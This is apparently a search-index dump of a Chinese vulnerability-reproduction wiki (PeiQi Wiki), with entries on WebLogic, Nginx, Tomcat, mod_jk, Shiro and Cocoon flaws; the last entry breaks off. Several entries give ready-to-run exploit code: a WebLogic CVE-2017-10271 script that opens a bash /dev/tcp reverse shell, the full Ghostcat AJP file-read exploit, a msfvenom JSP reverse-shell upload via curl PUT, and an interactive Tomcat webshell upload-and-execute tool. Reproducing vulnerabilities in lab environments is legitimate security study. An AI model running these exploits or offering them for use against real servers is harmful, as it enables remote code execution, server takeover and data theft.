{"./":{"url":"./","title":"关于文库","keywords":"","body":"PeiQI WiKi文库🐑 关于文库 如今漏洞的各种复现文章已经填满了互联网，但是每次去尝试漏洞复现时，总会纠结于环境搭建，POC和漏洞原理上。 由于这些因素，通常都需要翻阅很多很多的文章才能理解这个漏洞，于是，便萌生了把环境搭建，POC，漏洞原理全部集合在一个文库的想法，PeiQI WiKi文库便由此而来👻 关于使用 文库使用的是Gitbook，因为风格比较清新，简洁。于是便选择了它来搭建文库。 目前Wiki文库是开源的，每一个人都可以下载随时翻阅🐬 Github链接 码云链接 [!NOTE] POC文件都存放于漏洞分类后的目录中 [!NOTE] 网站目录上方支持正则搜索关键字快速查看 [!NOTE] 边框可以调整，字体大小和背景也支持更换 如何本地使用 [!NOTE] 1.Github 拉取代码 git clone https://gitee.com/yelisenyu/wiki.git git clone https://github.com/PeiQi0/wiki.git 2.下载 gitbook apt install npm npm install gitbook-cli -g 3.打开Wiki的目录下执行 gitbook serve 4.访问 http://localhost:4000 即可 最后 目前文库由我一人维护中，因为文库个人风格原因暂不接受师傅们的投稿。不过师傅们可以提出文库改良的意见给我。 [!NOTE] 别忘了Github下载完给个小星星⭐ PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/web_serve_wiki/":{"url":"PeiQi_Wiki/web_serve_wiki/","title":"Web服务器漏洞","keywords":"","body":"中间件漏洞整理🦔 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/web_serve_wiki/Weblogic/":{"url":"PeiQi_Wiki/web_serve_wiki/Weblogic/","title":"Weblogic","keywords":"","body":"Weblogic漏洞整理 Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-11 15:41:57 "},"PeiQi_Wiki/web_serve_wiki/Weblogic/Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271.html":{"url":"PeiQi_Wiki/web_serve_wiki/Weblogic/Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271.html","title":"Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271","keywords":"","body":"Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271 漏洞描述 Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。 影响版本 [!NOTE] Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.0.0 Weblogic 12.2.1.2.0 环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:7001 正常即可 漏洞复现 对 http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType 进行访问，存在这个url则可能存在漏洞 使用POST方法上传以下数据反弹一个shell /bin/bash -c bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1 使用Curl反弹shell (将上面的xml数据保存为poc.xml) curl -v -X POST -H \"Content-Type: text/xml\" --data @poc.xml \"http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType\" 也可以通过漏洞写入webshell文件 servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp ]]> 访问 http://xxx.xxx.xxx.xxx:7001/bea_wls_internal/test.jsp 即可得到写入的文件 漏洞利用POC 利用 weblogic-scan快速检测 [!NOTE] 反弹shell exp #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Weblogic 10.3.6.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.1.3.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.2.0 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2017-10271.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:7001 \\033[0m') print('+ \\033[36mCmd >>> shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url, IP, PORT): vuln_url = target_url + \"/wls-wsat/CoordinatorPortType\" headers = { \"Content-Type\": \"text/xml\", \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" /bin/bash -c bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1 \"\"\" % (IP,PORT) try: response = requests.request(\"POST\", url=vuln_url, headers=headers, data=data) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_1(target_url, IP, PORT) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-11 17:44:28 "},"PeiQi_Wiki/web_serve_wiki/Nginx/":{"url":"PeiQi_Wiki/web_serve_wiki/Nginx/","title":"Nginx","keywords":"","body":"Nginx漏洞整理 Nginx越界读取缓存漏洞 CVE-2017-7529 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-11 15:41:50 "},"PeiQi_Wiki/web_serve_wiki/Nginx/Nginx越界读取缓存漏洞 CVE-2017-7529.html":{"url":"PeiQi_Wiki/web_serve_wiki/Nginx/Nginx越界读取缓存漏洞 CVE-2017-7529.html","title":"Nginx越界读取缓存漏洞 CVE-2017-7529","keywords":"","body":"Nginx越界读取缓存漏洞 CVE-2017-7529 漏洞描述 Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。 如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。 影响版本 [!NOTE] Nginx version 0.5.6 - 1.13.2 环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080 正常即可 漏洞复现 使用目录下的POC进行验证 python poc.py http://xxx.xxx.xxx.xxx:8080/ 漏洞利用POC #!/usr/bin/env python import sys import requests if len(sys.argv) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-11 15:47:59 "},"PeiQi_Wiki/web_serve_wiki/Apache/":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/","title":"Apache","keywords":"","body":"Apache 漏洞整理👻 Apache Mod_jk Apache Mod_jk 访问控制权限绕过 CVE-2018-11759 Apache Tomcat Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938 Apache Tomcat 远程代码执行漏洞 CVE-2017-12615 Apache Shiro Apache Shiro Apache Cocoon Apache Cocoon XML注入 CVE-2020-11991 Apache Flink Apache Flink Apache Kylin Apache kylin 未授权配置泄露 CVE-2020-13937 Apache Kylin 命令注入漏洞 CVE-2020-1956 Apache Kylin 命令注入漏洞 CVE-2020-13925 Apache Solr Apache Solr 远程执行漏洞 CVE-2019-0193 Apache Solr Velocity模板远程执行 CVE-2019-17558 Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629 Apache Solr XXE 漏洞 CVE-2017-12629 Apache Solr JMX服务 RCE CVE-2019-12409 Apache Solr RCE 未授权上传漏洞 CVE-2020-13957 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-11 11:27:07 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Mod_jk/":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Mod_jk/","title":"Apache Mod_jk","keywords":"","body":"Apache Mod_jk Apache Mod_jk 访问控制权限绕过 CVE-2018-11759 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-11 11:27:21 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Mod_jk/Apache Mod_jk 访问控制权限绕过 CVE-2018-11759.html":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Mod_jk/Apache Mod_jk 访问控制权限绕过 CVE-2018-11759.html","title":"Apache Mod_jk 访问控制权限绕过 CVE-2018-11759","keywords":"","body":"Apache Mod_jk 访问控制权限绕过 CVE-2018-11759 漏洞描述 Apache Tomcat JK（mod_jk）Connector是美国阿帕奇（Apache）软件基金会的一款为Apache或IIS提供连接后台Tomcat的模块，用以为Apache或IIS服务器提供处理JSP/Servlet的能力。 由于httpd和Tomcat在路径处理规范上存在差异，因此可以绕过Apache mod_jk Connector 1.2.0版本到1.2.44版本上由JkMount httpd指令所定义端点的访问控制限制。 如果一个只有只读权限的jkstatus的接口可以访问的话，那么就有可能能够公开由mod_jk模块给AJP提供服务的内部路由。 如果一个具有读写权限的jkstatus接口可供访问，我们就能通过修改AJP的配置文件中相关配置来劫持或者截断所有经过mod_jk的流量，又或者进行内部的端口扫描。 影响版本 [!NOTE] Apache Mod_jk Connector 1.2.0 ~ 1.2.44 环境搭建 git clone https://github.com/immunIT/CVE-2018-11759.git docker-conpose up -d 访问 http://xxx.xxx.xxx.xxx:80 成功即可 漏洞复现 访问 http://xxx.xxx.xxx.xxx/jkstatus 显示无权限访问 Forbidden You don't have permission to access /jkstatus on this server. 访问 http://xxx.xxx.xxx.xxx/jkstatus; 即可绕过 [!NOTE] 注意是在url后面加上了一个; PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-11 11:26:27 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Tomcat/":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Tomcat/","title":"Apache Tomcat","keywords":"","body":"Apache Tomcat Aapache Tomcat AJP 文件包含漏洞 CVE-2020-1938 Apache Tomcat 远程代码执行漏洞 CVE-2017-12615 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-08 22:41:06 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Tomcat/Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938.html":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Tomcat/Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938.html","title":"Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938","keywords":"","body":"Aapache Tomcat AJP 文件包含漏洞 CVE-2020-1938 漏洞描述 Java 是目前 Web 开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。 Ghostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。 影响版本 [!NOTE] Apache Tomcat 6 Apache Tomcat 7 Apache Tomcat 8 Apache Tomcat 9 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080/ 正常即可 漏洞复现 目前有可靠的利用脚本 Gihub工具下载链接 python CNVD-2020-10487-Tomcat-Aj p-lfi.py -p 8009 -f /WEB-INF/web.xml xxx.xxx.xxx.xxx [!NOTE] 脚本需要使用python2来运行，此漏洞用于上传路径可控，开放8009端口AJP协议情况下通过读取文件执行命令 漏洞利用POC https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py #!/usr/bin/env python #CNVD-2020-10487 Tomcat-Ajp lfi #by ydhcui import struct # Some references: # https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html def pack_string(s): if s is None: return struct.pack(\">h\", -1) l = len(s) return struct.pack(\">H%dsb\" % l, l, s.encode('utf8'), 0) def unpack(stream, fmt): size = struct.calcsize(fmt) buf = stream.read(size) return struct.unpack(fmt, buf) def unpack_string(stream): size, = unpack(stream, \">h\") if size == -1: # null string return None res, = unpack(stream, \"%ds\" % size) stream.read(1) # \\0 return res class NotFoundException(Exception): pass class AjpBodyRequest(object): # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) MAX_REQUEST_LENGTH = 8186 def __init__(self, data_stream, data_len, data_direction=None): self.data_stream = data_stream self.data_len = data_len self.data_direction = data_direction def serialize(self): data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH) if len(data) == 0: return struct.pack(\">bbH\", 0x12, 0x34, 0x00) else: res = struct.pack(\">H\", len(data)) res += data if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbH\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbH\", 0x41, 0x42, len(res)) return header + res def send_and_receive(self, socket, stream): while True: data = self.serialize() socket.send(data) r = AjpResponse.receive(stream) while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS: r = AjpResponse.receive(stream) if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4: break class AjpForwardRequest(object): _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28) REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE} # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) COMMON_HEADERS = [\"SC_REQ_ACCEPT\", \"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\", \"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\", \"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\" ] ATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"] def __init__(self, data_direction=None): self.prefix_code = 0x02 self.method = None self.protocol = None self.req_uri = None self.remote_addr = None self.remote_host = None self.server_name = None self.server_port = None self.is_ssl = None self.num_headers = None self.request_headers = None self.attributes = None self.data_direction = data_direction def pack_headers(self): self.num_headers = len(self.request_headers) res = \"\" res = struct.pack(\">h\", self.num_headers) for h_name in self.request_headers: if h_name.startswith(\"SC_REQ\"): code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1 res += struct.pack(\"BB\", 0xA0, code) else: res += pack_string(h_name) res += pack_string(self.request_headers[h_name]) return res def pack_attributes(self): res = b\"\" for attr in self.attributes: a_name = attr['name'] code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1 res += struct.pack(\"b\", code) if a_name == \"req_attribute\": aa_name, a_value = attr['value'] res += pack_string(aa_name) res += pack_string(a_value) else: res += pack_string(attr['value']) res += struct.pack(\"B\", 0xFF) return res def serialize(self): res = \"\" res = struct.pack(\"bb\", self.prefix_code, self.method) res += pack_string(self.protocol) res += pack_string(self.req_uri) res += pack_string(self.remote_addr) res += pack_string(self.remote_host) res += pack_string(self.server_name) res += struct.pack(\">h\", self.server_port) res += struct.pack(\"?\", self.is_ssl) res += self.pack_headers() res += self.pack_attributes() if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbh\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbh\", 0x41, 0x42, len(res)) return header + res def parse(self, raw_packet): stream = StringIO(raw_packet) self.magic1, self.magic2, data_len = unpack(stream, \"bbH\") self.prefix_code, self.method = unpack(stream, \"bb\") self.protocol = unpack_string(stream) self.req_uri = unpack_string(stream) self.remote_addr = unpack_string(stream) self.remote_host = unpack_string(stream) self.server_name = unpack_string(stream) self.server_port = unpack(stream, \">h\") self.is_ssl = unpack(stream, \"?\") self.num_headers, = unpack(stream, \">H\") self.request_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code > 0xA000: h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001] else: h_name = unpack(stream, \"%ds\" % code) stream.read(1) # \\0 h_value = unpack_string(stream) self.request_headers[h_name] = h_value def send_and_receive(self, socket, stream, save_cookies=False): res = [] i = socket.sendall(self.serialize()) if self.method == AjpForwardRequest.POST: return res r = AjpResponse.receive(stream) assert r.prefix_code == AjpResponse.SEND_HEADERS res.append(r) if save_cookies and 'Set-Cookie' in r.response_headers: self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie'] # read body chunks and end response packets while True: r = AjpResponse.receive(stream) res.append(r) if r.prefix_code == AjpResponse.END_RESPONSE: break elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK: continue else: raise NotImplementedError break return res class AjpResponse(object): _,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7) COMMON_SEND_HEADERS = [ \"Content-Type\", \"Content-Language\", \"Content-Length\", \"Date\", \"Last-Modified\", \"Location\", \"Set-Cookie\", \"Set-Cookie2\", \"Servlet-Engine\", \"Status\", \"WWW-Authenticate\" ] def parse(self, stream): # read headers self.magic, self.data_length, self.prefix_code = unpack(stream, \">HHb\") if self.prefix_code == AjpResponse.SEND_HEADERS: self.parse_send_headers(stream) elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK: self.parse_send_body_chunk(stream) elif self.prefix_code == AjpResponse.END_RESPONSE: self.parse_end_response(stream) elif self.prefix_code == AjpResponse.GET_BODY_CHUNK: self.parse_get_body_chunk(stream) else: raise NotImplementedError def parse_send_headers(self, stream): self.http_status_code, = unpack(stream, \">H\") self.http_status_msg = unpack_string(stream) self.num_headers, = unpack(stream, \">H\") self.response_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code H\") self.data = stream.read(self.data_length+1) def parse_end_response(self, stream): self.reuse, = unpack(stream, \"b\") def parse_get_body_chunk(self, stream): rlen, = unpack(stream, \">H\") return rlen @staticmethod def receive(stream): r = AjpResponse() r.parse(stream) return r import socket def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET): fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER) fr.method = method fr.protocol = \"HTTP/1.1\" fr.req_uri = req_uri fr.remote_addr = target_host fr.remote_host = None fr.server_name = target_host fr.server_port = 80 fr.request_headers = { 'SC_REQ_ACCEPT': 'text/html', 'SC_REQ_CONNECTION': 'keep-alive', 'SC_REQ_CONTENT_LENGTH': '0', 'SC_REQ_HOST': target_host, 'SC_REQ_USER_AGENT': 'Mozilla', 'Accept-Encoding': 'gzip, deflate, sdch', 'Accept-Language': 'en-US,en;q=0.5', 'Upgrade-Insecure-Requests': '1', 'Cache-Control': 'max-age=0' } fr.is_ssl = False fr.attributes = [] return fr class Tomcat(object): def __init__(self, target_host, target_port): self.target_host = target_host self.target_port = target_port self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.connect((target_host, target_port)) self.stream = self.socket.makefile(\"rb\", bufsize=0) def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]): self.req_uri = req_uri self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method)) print(\"Getting resource at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri)) if user is not None and password is not None: self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + (\"%s:%s\" % (user, password)).encode('base64').replace('\\n', '') for h in headers: self.forward_request.request_headers[h] = headers[h] for a in attributes: self.forward_request.attributes.append(a) responses = self.forward_request.send_and_receive(self.socket, self.stream) if len(responses) == 0: return None, None snd_hdrs_res = responses[0] data_res = responses[1:-1] if len(data_res) == 0: print(\"No data in response. Headers:%s\\n\" % snd_hdrs_res.response_headers) return snd_hdrs_res, data_res ''' javax.servlet.include.request_uri javax.servlet.include.path_info javax.servlet.include.servlet_path ''' import argparse parser = argparse.ArgumentParser() parser.add_argument(\"target\", type=str, help=\"Hostname or IP to attack\") parser.add_argument('-p', '--port', type=int, default=8009, help=\"AJP port to attack (default is 8009)\") parser.add_argument(\"-f\", '--file', type=str, default='WEB-INF/web.xml', help=\"file path :(WEB-INF/web.xml)\") args = parser.parse_args() t = Tomcat(args.target, args.port) _,data = t.perform_request('/asdf',attributes=[ {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']}, {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]}, {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']}, ]) print('----------------------------') print(\"\".join([d.data for d in data])) 参考文章 Github地址 威胁通告 APACHE TOMCAT 文件包含漏洞（CVE-2020-1938） PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-08 20:18:49 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Tomcat/Apache Tomcat 远程代码执行漏洞 CVE-2017-12615.html":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Tomcat/Apache Tomcat 远程代码执行漏洞 CVE-2017-12615.html","title":"Apache Tomcat 远程代码执行漏洞 CVE-2017-12615","keywords":"","body":"Apache Tomcat 远程代码执行漏洞 CVE-2017-12615 漏洞描述 2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，其中就有远程代码执行漏洞(CVE-2017-12615)。当 启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。 影响版本 [!NOTE] Apache Tomcat 7.0.0 - 7.0.81 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2017-12615 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080/ 正常即可 漏洞复现 漏洞产生的主要原因来自于conf/web.xml文件配置错误,readonly开启了false,导致可以使用PUT/DELETE请求方法操作文件 msf生成一个jsp木马 msfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=9999 -f raw > shell.jsp 利用PUT方法上传木马 curl -v -X PUT --data-binary @shell.jsp \"http://81.68.139.186:8080/shell.jsp/\" [!NOTE] 注意 http://xxx.xxx.xxx.xxx:8080/shell.jsp/中的最后一个\"/\"字符很重要 发现成功上传木马文件 访问文件即可反弹一个shell 也可以使用DELETE请求方法删除文件 漏洞利用POC [!NOTE] 代码只用于检测漏洞，反弹shell参照上方 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Tomcat 7.0.0 - 7.0.81 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2017-12615.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8080 \\033[0m') print('+ \\033[36mCmd >>> shell \\033[0m') print('+ \\033[36mCmd >>> exit(退出交互并删除webshell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): md5_filename = str(random.randint(1,999)).encode(\"utf-8\") file_name = hashlib.md5(md5_filename).hexdigest() vuln_put_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" \"\"\" try: response = requests.request(\"PUT\", url=vuln_put_url, data=data, headers=headers, timeout=30) if response.status_code == 201 or response.status_code == 201: print(\"\\033[32m[o] 含有CVE-2017-12615漏洞，成功上传shell，文件名为{}.jsp,响应为{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] 漏洞利用失败,PUT方法关闭 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败,PUT方法关闭 \\033[0m\") sys.exit(0) def POC_2(target_url, file_name, cmd): vuln_cmd_url = target_url + \"/\" + file_name + \".jsp?\" + \"pwd=peiqi&cmd=\" + cmd headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=vuln_cmd_url, headers=headers,timeout=30) if response.status_code == 200: print(\"\\033[32m[o] 成功执行命令,响应为:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] 漏洞利用失败,命令无法执行 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败,命令无法执行 \\033[0m\") sys.exit(0) def POC_3(target_url, file_name): vuln_delect_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.request(\"DELETE\", url=vuln_delect_url, headers=headers, timeout=30) if response.status_code == 200 or 201: print(\"\\033[32m[o] 成功删除shell，文件名为{}.jsp,响应为{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] 删除失败 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 删除失败 \\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = POC_1(target_url) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": POC_3(target_url, file_name) sys.exit(0) else: POC_2(target_url, file_name, cmd) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-08 23:04:49 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Shiro/":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Shiro/","title":"Apache Shio","keywords":"","body":"Apache Shiro Apache Shiro PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-08 20:19:14 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Shiro/Apache Shiro =1.2.4反序列化漏洞 CVE-2016-4437.html":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Shiro/Apache Shiro =1.2.4反序列化漏洞 CVE-2016-4437.html","title":"Apache Shiro =1.2.4反序列化漏洞 CVE-2016-4437","keywords":"","body":"Apache Shiro 漏洞描述 Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。 影响版本 [!NOTE] Apache Shiro 漏洞环境 https://github.com/vulhub/vulhub.git cd vulhub/shiro/CVE-2016-4437 docker-compose up -d 访问http://xxx.xxx.xxx.xxx:8080/login正常即可 漏洞复现 Shiro已经有比较完善的工具 https://github.com/insightglacier/Shiro_exploit https://github.com/feihong-cs/ShiroExploit/releases/tag/v2.51 这里使用的是 ShiroExploit 工具进行复现 打开后输入url即可 成功反弹shell 参考文章 Shiro RememberMe 1.2.4远程代码执行漏洞-详细分析 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-08 16:10:43 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Cocoon/":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Cocoon/","title":"Apache Coocon","keywords":"","body":"Apache Cocoon Apache Cocoon XML注入 CVE-2020-11991 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-08 12:42:56 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Cocoon/Apache Cocoon XML注入 CVE-2020-11991.html":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Cocoon/Apache Cocoon XML注入 CVE-2020-11991.html","title":"Apache Cocoon XML注入 CVE-2020-11991","keywords":"","body":"Apache Cocoon XML注入 CVE-2020-11991 漏洞描述 9月11日 Apache 软件基金会发布安全公告，修复了 Apache Cocoon xml外部实体注入漏洞（CVE-2020-11991）。 Apache Cocoon 是一个基于 Spring 框架的围绕分离理念建立的构架，在这种框架下的所有处理都被预先定义好的处理组件线性连接起来，能够将输入和产生的输出按照流水线顺序处理。用户群：Apache Lenya、Daisy CMS、Hippo CMS、Mindquarry等等，Apache Cocoon 通常被作为一个数据抽取、转换、加载工具或者是系统之间传输数据的中转站。CVE-2020-11991 与 StreamGenerator 有关，在使用 StreamGenerator 